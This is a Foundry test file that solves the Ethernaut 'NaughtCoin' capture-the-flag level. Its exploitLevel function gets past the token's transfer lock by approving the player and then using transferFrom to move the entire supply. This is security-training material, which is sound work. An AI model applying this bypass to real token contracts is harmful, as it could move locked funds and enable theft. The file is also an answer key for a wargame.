// SPDX-License-Identifier: MIT

pragma solidity ^0.8.18;

import {console, Test} from "forge-std/Test.sol";
import {NaughtCoin} from "../../src/15/NaughtCoin.sol";
import {HelperConfig} from "../../script/HelperConfig.s.sol";
import {NaughtCoinFactory} from "src/15/NaughtCoinFactory.sol";
import {Ethernaut} from "src/Ethernaut.sol";
import {BaseTest} from "../BaseTest.sol";
import {Vm} from "forge-std/Vm.sol";

contract NaughtCoinTest is Test, BaseTest {
    NaughtCoin public instanceContract;

    constructor() {
        // SETUP LEVEL FACTORY
        levelFactory = address(new NaughtCoinFactory());
        vm.deal(player, 1 ether);
    }

    function setUp() public override {
        super.setUp();
        config = new HelperConfig{value: 1 ether}(levelFactory);
        (ethernaut, instance,) = config.activeNetworkConfig();

        instanceContract = NaughtCoin(instance);
    }

    function testBalanceInstanceContractIsNot0() public view {
        assert(instanceContract.balanceOf(player) == instanceContract.INITIAL_SUPPLY());
    }

    function testRunLevel() public {
        runLevel();
    }

    function exploitLevel() internal override {
        
        vm.startPrank(player);
        instanceContract.approve(player, instanceContract.INITIAL_SUPPLY());
        instanceContract.transferFrom(player, owner, instanceContract.INITIAL_SUPPLY());
        vm.stopPrank();

        assert(instanceContract.balanceOf(player) == 0);
        assert(instanceContract.balanceOf(owner) == instanceContract.INITIAL_SUPPLY());
    }
}
